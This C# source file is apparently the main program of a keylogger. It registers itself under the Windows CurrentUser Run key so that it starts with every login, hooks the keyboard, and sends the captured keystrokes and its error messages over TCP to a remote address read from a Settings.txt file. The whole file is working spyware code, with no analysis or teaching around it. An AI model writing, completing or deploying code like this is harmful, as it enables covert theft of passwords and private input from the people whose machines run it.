using System.Dynamic;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;

class Program{
    private static string PathToSettingsRemoteIPAddres = "Settings.txt";
    private static void Get(byte[] data){
        string str = Encoding.Unicode.GetString(data,0,data.Length);
        Console.WriteLine(str);
    }
    private static TcpClient client = new TcpClient();
    private static void Exit(object sender,EventArgs ev){
        client?.Disconnect();
        KeyHook.isWork = false;
    }
    public static void Main(string[] args){
        try{
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(Exit);
            RegistryKey regKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            string ProgramPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string ProgramName = ProgramPath.Split("\\").Last();
            ProgramName = ProgramName.Split(".").ElementAt(0);
            if(ProgramName is not "dotnet")
                regKey.SetValue(ProgramName,ProgramPath);
            KeyHook.Start(client.Send);
            string ip = "127.0.0.1:11000";
            if(File.Exists(PathToSettingsRemoteIPAddres))
                ip = File.ReadAllText(PathToSettingsRemoteIPAddres);
            string[] socket = ip.Split(":");
            client.Exec(socket[0],int.Parse(socket[1])); //Blocking Thread
        }
        catch(SocketException){
           
        }
        catch(Exception exep){
            byte[] sendData = Encoding.Unicode.GetBytes(exep.Message);
            client.Send(sendData,false);
        }
    }
}